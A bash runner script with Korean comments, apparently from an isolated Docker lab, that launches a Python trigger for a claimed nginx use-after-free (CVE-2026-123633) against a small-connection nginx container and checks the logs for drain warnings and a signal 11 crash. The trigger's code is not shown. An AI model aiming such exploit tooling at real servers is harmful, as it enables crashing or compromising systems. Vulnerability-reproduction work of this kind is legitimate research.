#!/bin/bash
# CVE-2026-123633 트리거 러너 — proxy-small 변형(worker_connections 16) + drain 경합
# 사용: ops/run_123633.sh <episode명> [partials] [padding] [news]
set -euo pipefail
cd "$(dirname "$0")/.."

EP="${1:?episode required}"
W="${2:-10}"
M="${3:-6}"
K="${4:-6}"

docker compose -f ops/docker/compose.yaml --profile cve123633 up -d --force-recreate 2>&1 | tail -1
docker restart n2r-123633 >/dev/null
sleep 1
docker exec n2r-123633 sh -c 'grep -c "worker_connections 16" /usr/local/nginx/conf/nginx.conf' >/dev/null || \
  { echo "proxy-small conf 미적용 — 마운트 확인 필요" >&2; exit 1; }

echo "── 트리거 실행 (W=$W M=$M K=$K)"
docker run --rm --network nginx2root-lab_default \
  -v "$PWD/exploit:/work/exploit" \
  python:3.10-slim \
  python3 /work/exploit/trigger/trigger_123633.py \
    --host n2r-123633 --port 443 --tls \
    --partials "$W" --padding "$M" --news "$K" \
    --arm a1 --episode "$EP" || true

EPDIR="exploit/results/CVE-2026-123633/a1/$EP"
mkdir -p "$EPDIR"
echo "── 서버 관측 (drain WARN=경로 활성 / signal 11=UAF)"
docker logs n2r-123633 2>&1 | grep -E 'worker_connections are not enough|exited on signal|signal 11|reusing connection' \
  | tail -10 | tee "$EPDIR/server_observation.txt" || echo "(관측 없음 — 미지지)"
grep -q 'reusing connection' "$EPDIR/server_observation.txt" 2>/dev/null \
  && echo "판정: drain 경로 활성 (지지 축)" || true
grep -qE 'signal 11' "$EPDIR/server_observation.txt" 2>/dev/null \
  && echo "판정: UAF-확정 (SIGSEGV)" || true
